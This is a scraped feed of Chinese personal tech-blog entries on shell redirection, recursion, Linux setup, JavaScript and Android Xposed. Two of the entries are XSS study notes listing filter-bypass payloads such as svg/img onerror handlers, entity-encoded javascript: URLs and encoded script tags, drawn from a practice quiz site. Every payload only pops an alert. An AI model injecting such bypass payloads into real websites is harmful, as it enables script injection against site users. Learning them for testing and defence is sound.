<p>文件内容:stdout+stderr<br>先将stdout输出到file,此时的file就是该shell的stdout,之后再将stderr(2)重定向到stdout(1)</p>
<blockquote>
<p>误<br>find / -name ‘desktop’ 2&gt;&amp;1 &gt; tmpfile2</p>
</blockquote>
<p>文件内容:stdout<br>先将要输出到stderr的内容重定向到stdout，此时会<code>产生一个stdout的拷贝</code>，作为程序的stderr，而程序<code>原本要输出到stdout</code>的内容，依然是对接在stdout原身上的，因此<code>第二步重定向stdout</code>，对stdout的拷贝不产生任何影响</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h3><p><a href="https://segmentfault.com/q/1010000002454596" target="_blank" rel="external">https://segmentfault.com/q/1010000002454596</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[汉诺塔_递归]]></title>
      <url>http://csser.work/05/05/2016/js-hanoi/</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这个问题在大一学C的时候就一直纠结,再次看书遇到,就把他写下来作为笔记了!</p>
<h3 id="理解"><a href="#理解" class="headerlink" title="理解"></a>理解</h3><p>整体的概念 数学归纳法</p>
<h3 id="正"><a href="#正" class="headerlink" title="正"></a>正</h3><p>做了张图, 目标: 将塔SRC移到DST,利用AUX作为中转<br><img src="/imgs/hanoi/1.svg" alt="1"></p>
<p>抽象化:<br> 一个汉诺塔只需要分为底层B和上层A<br>步骤:<br>  A(SRC) =&gt; AUX;<br>  B(SRC) =&gt; DST;<br>  A(AUX) =&gt; DST; </p>
<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>一旦最大一个放在底下之后就可以忽略掉了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> hanoi = <span class="function"><span class="keyword">function</span>(<span class="params"> disc, src, aux, dst</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>( disc &gt; <span class="number">0</span> )&#123;</span><br><span class="line">    hanoi( disc<span class="number">-1</span>, src, dst, aux);  <span class="comment">//上层A(含多个)</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'Move disc'</span> + disc + <span class="string">' from '</span> + src + <span class="string">' to '</span> + dst ); <span class="comment">//下层B</span></span><br><span class="line">    hanoi( disc<span class="number">-1</span>, aux, src, dst);  <span class="comment">//上层A(含多个)</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>只要能抽象出来, 递归还是有点像一种声明式函数的</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.zhihu.com/question/24385418/answer/46241635" target="_blank" rel="external">知乎</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu16.04安装字体]]></title>
      <url>http://csser.work/05/04/2016/linux-soft-install-fonts/</url>
      <content type="html"><![CDATA[<p>我的字体:Droid Sans Fallback.ttf</p>
<h3 id="创建字体文件"><a href="#创建字体文件" class="headerlink" title="创建字体文件"></a>创建字体文件</h3><p>&gt;<br>sudo mkdir -p /usr/share/fonts/DroidSansFallback<br>sudo cp ~/Desktop/font/DroidSansFallback.ttf /usr/share/fonts/DroidSansFallback<br>sudo chmod 644 /usr/share/fonts/DroidSansFallback/DroidSansFallback.ttf</p>
<h3 id="建立字体库"><a href="#建立字体库" class="headerlink" title="建立字体库"></a>建立字体库</h3><p>&gt;<br>cd /usr/share/fonts/DroidSansFallback/<br>sudo mkfontscale （用来控制字体旋转缩放）<br>sudo mkfontdir （用来控制字体粗斜体产生）<br>sudo fc-cache -fv （建立字体缓存信息）</p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="http://my.oschina.net/itblog/blog/278566" target="_blank" rel="external">oschina-itblog</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss_收集_1]]></title>
      <url>http://csser.work/05/03/2016/xss-2/</url>
      <content type="html"><![CDATA[<h2 id="记录碰到过的XSS"><a href="#记录碰到过的XSS" class="headerlink" title="记录碰到过的XSS"></a>记录碰到过的XSS</h2><p>序号乱了,算了</p>
<ol>
<li>()=被过滤   <svg>实体编码</svg></li>
</ol>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;      // Works With All Browsers</span><br><span class="line">( is html encoded to &amp;#40</span><br><span class="line">) is html encoded to &amp;#41</span><br></pre></td></tr></table></figure>
<ol>
<li>浏览器Prasing 先闭合再找新标签</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">INPUT</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">value</span>=<span class="string">'&lt;SCRIPT&gt;alert("XSS")&lt;/SCRIPT&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"'输出点'"</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br><span class="line">XSS_payload=  "type=&amp;#105;&amp;#109;&amp;#97;&amp;#103;&amp;#101; src onerror</span><br><span class="line">="prompt(1)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>x———onerror和=之间换行仍然可以解析,———-可以绕过正则———</p>
<ol>
<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">autofocus</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>chrome base标签,不可覆盖 </p>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">"javascript:\"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"//%0aalert(1);//"</span>&gt;</span>Click Me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>img source可分开写</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">picture</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">srcset</span>=<span class="string">1</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><strong>—————-ES6 神招 backtick ` 直接代替()——————–</strong></li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>Chrome Only</li>
</ol>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> ?<span class="attr">itworksonchrome</span>?\/<span class="attr">onerror</span> = <span class="string">alert(1)</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span>/<span class="attr">src</span>/<span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>13.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">alert/**/(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>JS中</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(</span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">alert(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line">)() <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">alert</span><br><span class="line">(<span class="number">1</span>) <span class="comment">//OK</span></span><br><span class="line"></span><br><span class="line">aler</span><br><span class="line">t(<span class="number">1</span>) <span class="comment">//aler Not defined</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>img利用 </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"comment"</span> <span class="attr">title</span>=<span class="string">""</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="</span><span class="attr">comment</span>" <span class="attr">title</span>=<span class="string">""</span><span class="attr">onerror</span>=<span class="string">'/*"&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class="comment" title="*/prompt(1)'</span>"&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="部分Reference"><a href="#部分Reference" class="headerlink" title="部分Reference"></a>部分Reference</h2><p><a href="http://lcx.cc/?i=4427" target="_blank" rel="external">核总</a><br><a href="http://www.cnblogs.com/hookjoy/p/3612044.html" target="_blank" rel="external">hookjoy</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[xss习题集_1]]></title>
      <url>http://csser.work/04/19/2016/xss-1/</url>
      <content type="html"><![CDATA[<p>最近做了一个xss练习.<br>练习站点: <a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">http://xss-quiz.int21h.jp</a><br>如果需要练习,请使用<code>firefox</code>或者<code>IE</code></p>
<h3 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h3><ol>
<li>test1-2</li>
</ol>
<p>script标签中可以使用<code>\x \</code>等进制</p>
<ol>
<li><p>一旦&lt;&gt;被实体化之后,XSS就无法绕过</p>
</li>
<li><p>标签<code>src href</code>属性中可以尝试使用Entity实体编码进行正则绕过<br> Chrome的js检测绕过! 火狐存在路径问题</p>
<blockquote>
<p>POC如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"jav&amp;#10;ascript:alert('XSS');"</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"jav&amp;#x0D;ascript:alert('XSS');"</span>&gt;</span>xxx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>利用iframe的src属性<br>iframe可以调用父级 parent.alert(),data协议有个规定,一旦使用很可能会跳转至新的标签页,但是内嵌iframe会相对好一点</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5wYXJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4"&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>引号过滤的话就很困难了, 靠其他情况绕过</p>
</li>
<li><p>document.write() 编码绕过<br>a.unicode   无需\转义,直接写就行 例: <code>\u003c</code><br>b.16hex &amp; 8hex   需要对\进行转义例如: </p>
<pre><code>`\\x3cscript\\x3ealert(/xss/)\\x3c\\x2fscript\\x3e`
`\\74script\\76alert(document.domain)\\74\\57script\\76`
</code></pre></li>
<li><p>JS段中实体编码绕过正则过滤<br>Twitter DomXss at Sep 24, 2010</p>
</li>
</ol>
<h3 id="Reference-amp-Dictionary"><a href="#Reference-amp-Dictionary" class="headerlink" title="Reference &amp; Dictionary"></a>Reference &amp; Dictionary</h3><p><a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">实体编码表</a><br><a href="https://github.com/matachi/MaTachi.github.io/blob/master/src/pages/solutions-to-the-wargame-xss-challenges-at-xss-quiz-int21h-jp.md" target="_blank" rel="external">write up_1</a><br><a href="https://blogs.tunelko.com/2013/12/02/xss-challenges/" target="_blank" rel="external">write up_2</a><br><a href="http://blog.knownsec.com/Knownsec_RD_Checklist/xss/xss_quiz.txt" target="_blank" rel="external">write up_3</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[js_arrow function]]></title>
      <url>http://csser.work/04/12/2016/js-arrow-func/</url>
      <content type="html"><![CDATA[<h3 id="箭头函数"><a href="#箭头函数" class="headerlink" title="箭头函数"></a>箭头函数</h3><p>函数式编程~<br>简写的函数表达式</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a1 = [</span><br><span class="line">  <span class="string">'ab'</span>,</span><br><span class="line">  <span class="string">'cde'</span>,</span><br><span class="line">  <span class="string">'fghi'</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a2 = a1.map(<span class="function"><span class="keyword">function</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> arr.length;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a3 = a1.map( arr =&gt; arr.length );</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a2+<span class="string">'\n'</span>+a3);</span><br><span class="line"><span class="comment">//  2,3,4 \n 2,3,4</span></span><br></pre></td></tr></table></figure>
<p>在学习nodejs中看到这么一段代码,想了一下<code>=&gt;</code>就代表了一个<code>匿名函数</code>啊,多简洁!<br>代码示例:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.get(<span class="string">'http://www.google.com/index.html'</span>, (res) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Got response: <span class="subst">$&#123;res.statusCode&#125;</span>`</span>);</span><br><span class="line">  <span class="comment">// consume response body</span></span><br><span class="line">  res.resume();</span><br><span class="line">&#125;).on(<span class="string">'error'</span>, (e) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Got error: <span class="subst">$&#123;e.message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
<h3 id="05-18-2016更新"><a href="#05-18-2016更新" class="headerlink" title="05/18/2016更新"></a>05/18/2016更新</h3><p>There are some different in <code>this</code> key word.</p>
<ol>
<li><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmitter</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> MyEmitter();</span><br><span class="line">myEmitter.on(<span class="string">'event'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a, b, <span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">// Prints:</span></span><br><span class="line">    <span class="comment">//   a b MyEmitter &#123;</span></span><br><span class="line">    <span class="comment">//     domain: null,</span></span><br><span class="line">    <span class="comment">//     _events: &#123; event: [Function] &#125;,</span></span><br><span class="line">    <span class="comment">//     _eventsCount: 1,</span></span><br><span class="line">    <span class="comment">//     _maxListeners: undefined &#125;</span></span><br><span class="line">&#125;);</span><br><span class="line">myEmitter.emit(<span class="string">'event'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> EventEmitter = <span class="built_in">require</span>(<span class="string">'events'</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyEmitter</span> <span class="keyword">extends</span> <span class="title">EventEmitter</span> </span>&#123;&#125;</span><br><span class="line"><span class="keyword">const</span> myEmitter = <span class="keyword">new</span> MyEmitter();</span><br><span class="line">myEmitter.on(<span class="string">'event'</span>, (a, b) =&gt; &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(a, b, <span class="keyword">this</span>);</span><br><span class="line">    <span class="comment">// Prints: a b &#123;&#125;</span></span><br><span class="line">&#125;);</span><br><span class="line">myEmitter.emit(<span class="string">'event'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>);</span><br></pre></td></tr></table></figure>
<p>in Instance2 this-&gt;<code>{}</code></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ES6-JS的块级作用域]]></title>
      <url>http://csser.work/04/12/2016/js-let/</url>
      <content type="html"><![CDATA[<h3 id="ES6-js也能和其他语言一样使用块级作用域了"><a href="#ES6-js也能和其他语言一样使用块级作用域了" class="headerlink" title="ES6_js也能和其他语言一样使用块级作用域了~"></a>ES6_js也能和其他语言一样使用块级作用域了~</h3><p>块级作用域: 一对花括号<code>{}</code>括起来的代码域<br>一下子感觉js高级好多,块级作用域和执行域都在了~</p>
<h3 id="给几个例子-区别一下"><a href="#给几个例子-区别一下" class="headerlink" title="给几个例子,区别一下"></a>给几个例子,区别一下</h3><blockquote>
<ol>
<li>var</li>
</ol>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++ )&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i); <span class="comment">//0 1 2 3 4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">//  5</span></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li>let</li>
</ol>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">let</span> i = <span class="number">0</span>; i &lt; num; i++)&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(i); <span class="comment">//0 1 2 3 4</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(i); <span class="comment">//  Error: i is not defined</span></span><br></pre></td></tr></table></figure>
<p>应该很清楚了</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Linux_优化]]></title>
      <url>http://csser.work/04/03/2016/linux-hard-optimize/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>妈的智障(容我爆句粗口),终于搞定这破风扇了,以前在图书馆都特么异常的响,根本不给我面子!</p>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>Kernel: 3.19.0-56-generic x64<br>Release: Ubuntu 15.04</p>
<h3 id="优化项目"><a href="#优化项目" class="headerlink" title="优化项目"></a>优化项目</h3><ol>
<li>风扇</li>
<li>内置电源使用优化</li>
</ol>
<h3 id="风扇"><a href="#风扇" class="headerlink" title="风扇"></a>风扇</h3><p>(Thinkpad请忽略,以后我也买= =)</p>
<p>Issue:<br>最近实在受不了风扇一天到晚的响,一直以为自己的<code>indicator-cpufreq</code>很正常,是bios的问题,今天一看发现有问题</p>
<blockquote>
<p>indicator-cpufreq -f </p>
</blockquote>
<p><code>-f</code>也是网上留意到的,manpage也就两个无用选项.这个选项用了之后才发现我那个powersaved模式根本没有卵用,一直是急速模式(超频3.5GHz)的状态,怪不得风扇一天到晚响</p>
<p>Solution:</p>
<blockquote>
<p>sudo gnome-session-properties</p>
</blockquote>
<p>打开GUI自启动界面(以前安装完indicator-cpufreq就自动加入了自动启动),添加<code>-f</code>选项,来显示实时cpu频率</p>
<blockquote>
<p>sudo vi /etc/default/grub</p>
</blockquote>
<p>在<code>GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash&quot;</code>里面添加<code>intel_pstate=disable</code></p>
<p>之后更新一下grub</p>
<blockquote>
<p>sudo update-grub</p>
</blockquote>
<p>重启之后同样设置powersave,然后cpu频率就正常了…</p>
<h3 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h3><p>软件: TLP</p>
<blockquote>
<p>sudo add-apt-repository ppa:linrunner/tlp<br> sudo apt-get update<br> sudo apt-get install tlp tlp-rdw smartmontools ethtool</p>
</blockquote>
<p>基本装完的默认设置看了一下也没什么要改的.具体的配置什么的请看<a href="#Reference">#Reference</a></p>
<h3 id="Intel-GPU优化"><a href="#Intel-GPU优化" class="headerlink" title="Intel GPU优化"></a>Intel GPU优化</h3><p>同第一个,在default中添加</p>
<blockquote>
<p>i915.lvds_downclock=1 drm.vblankoffdelay=1 i915.semaphores=1 i915_enable_rc6=1 i915_enable_fbc=1</p>
</blockquote>
<p>然后update重启</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>ASKubuntu:<br><a href="http://askubuntu.com/questions/285434/is-there-a-power-saving-application-similar-to-jupiter" target="_blank" rel="external">saving_applicaion</a><br><a href="http://askubuntu.com/questions/544266/why-are-missing-the-frequency-options-on-cpufreq-utils-indicator" target="_blank" rel="external">frequency_options</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Daily Collection]]></title>
      <url>http://csser.work/04/01/2016/daily-collection/</url>
      <content type="html"><![CDATA[<h2 id="DEV"><a href="#DEV" class="headerlink" title="DEV"></a>DEV</h2><p><a href="https://archive.org/web/" target="_blank" rel="external">快照</a>  <a href="http://idea.lanyus.com/" target="_blank" rel="external">IDEA注册码</a>  <a href="http://www.waqiang.com/index.php/url/shorten" target="_blank" rel="external">短网址</a><br><a href="http://paste.ofcode.org/" target="_blank" rel="external">code-paste</a>  <a href="http://div.io/topic/609?page=1" target="_blank" rel="external">从FE的角度上再看输入url后都发生了什么</a><br><a href="http://www.fmwconcepts.com/imagemagick/" target="_blank" rel="external">神站!ImageMagick的脚本</a>  <a href="http://zh.learnlayout.com/" target="_blank" rel="external">学习CSS布局</a></p>
<h2 id="Code-Fun"><a href="#Code-Fun" class="headerlink" title="Code_Fun"></a>Code_Fun</h2><p><a href="http://weavesilk.com/" target="_blank" rel="external">Silk</a>  <a href="http://codepen.io/jakealbaugh/full/PwLXXP/" target="_blank" rel="external">代码自实现</a>  <a href="http://chirag64.github.io/t-rex-runner-bot/" target="_blank" rel="external">ChromeGameByAuto</a><br><a href="http://tholman.com/dom-animator/" target="_blank" rel="external">The F12’s Note</a>  </p>
<h2 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h2><p><a href="http://www.hotcleaner.com/clickclean-app.html" target="_blank" rel="external">Probe实现</a>  <a href="http://www.mortenclaussen.com/" target="_blank" rel="external">Mortenclaussen</a><br><code>制图利器</code><a href="https://www.processon.com/" target="_blank" rel="external">ProcessOn</a>  <a href="https://sketch.io/sketchpad/" target="_blank" rel="external">sketchPad</a></p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><p>文件系统<a href="http://www.pathname.com/fhs/pub/fhs-2.3.html#THEFILESYSTEM" target="_blank" rel="external">FHS</a></p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><p><a href="http://www.xda-developers.com/" target="_blank" rel="external">Xda</a><br><a href="http://xposed.appkg.com/1051.html" target="_blank" rel="external">Xposed</a>)</p>
<h2 id="Security"><a href="#Security" class="headerlink" title="Security"></a>Security</h2><p><a href="http://drops.wooyun.org/tips/147" target="_blank" rel="external">html解析规则_xss</a><br><a href="http://cheatsheets.hackdig.com/?4.htm" target="_blank" rel="external">xss绕过备忘录</a></p>
<blockquote>
<p>sql xss xml的常用字典(Kali2.0)<br>/usr/share/wfuzz/wordlist</p>
</blockquote>
<h2 id="WebDesign"><a href="#WebDesign" class="headerlink" title="WebDesign"></a>WebDesign</h2><p><a href="https://pages.github.com/" target="_blank" rel="external">Github</a>  <a href="https://www.heroku.com/" target="_blank" rel="external">heroku</a>  <a href="http://lmgtfy.com/?q=let+me+google+that+for+you&amp;l=1" target="_blank" rel="external">lmgtfy</a><br><a href="https://www.qingcloud.com/" target="_blank" rel="external">青云</a>  <a href="https://divshot.com/features" target="_blank" rel="external">divshot</a>  <a href="http://www.andrewmcwatters.com/" target="_blank" rel="external">ACPM</a>  <a href="http://blocsapp.com/" target="_blank" rel="external">Blocs</a><br><a href="http://bootswatch.com/" target="_blank" rel="external">Bootswatch</a>  <a href="http://sweet.2ch.sc/uptime.svg" target="_blank" rel="external">サーバ稼働状況</a>  <a href="https://twentyoverten.com" target="_blank" rel="external">Twenty Over Ten</a><br><a href="http://www.apple.com/" target="_blank" rel="external">Apple</a>  <a href="http://www.lucacasati.net/" target="_blank" rel="external">lucacasati</a>  <a href="http://www.squarespace.com/" target="_blank" rel="external">Build awebsite</a>  <a href="http://union.co/" target="_blank" rel="external">Union</a><br><a href="http://liulanqi.baidu.com/" target="_blank" rel="external">Baidu Browser</a>  </p>
<h2 id="Other’s"><a href="#Other’s" class="headerlink" title="Other’s"></a>Other’s</h2><p><a href="https://ruby-china.org/topics/17505" target="_blank" rel="external">如何学好一门编程语言技巧方法一粒-译</a></p>
<hr>
<h2 id="Videos"><a href="#Videos" class="headerlink" title="Videos"></a>Videos</h2><p><a href="www.kaixindy.com">海阔天空</a><br><a href="http://en.savefrom.net/" target="_blank" rel="external">YouTuBe-Download1</a>  <a href="http://vidstatsx.com/" target="_blank" rel="external">YouTuBe-Download2</a>  </p>
<h2 id="买买买"><a href="#买买买" class="headerlink" title="买买买"></a>买买买</h2><p><a href="www.smzdm.com">什么值得买</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Android6.0.1 Xposed安装以及插件推荐]]></title>
      <url>http://csser.work/03/30/2016/device-nexus-xposed/</url>
      <content type="html"><![CDATA[<p>xposed安装目的很明确:不想用庞大的LBE(耗电),需要启用greenify的Xposed扩展功能</p>
<h2 id="环境-amp-要求"><a href="#环境-amp-要求" class="headerlink" title="环境&amp;要求"></a>环境&amp;要求</h2><p>已Root的手机一台(Nexus5x)并且安装完第三方Recovery,安装包<br>安装程序: XposedInstaller_v3.0-alpha4_Modified.Kane.Multi.apk<br>框架模块: xposed-v80-sdk23-arm64.zip<br>下载地址: <a href="http://dl-xda.xposed.info/framework/" target="_blank" rel="external">XDA_Xposed for Lollipop and Marshmallow</a></p>
<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><ol>
<li>手机关机后(防止意外关机导致应用优化)长按<code>电源键+音量下</code><br>或者直接连上电脑adb reboot-bootloader进入recovery mode</li>
<li>进入Recovery Mode,选择Install,将放在Downloads中的框架模块选中安装即可</li>
<li>重启后安装xposed安装程序,提示xposed actived</li>
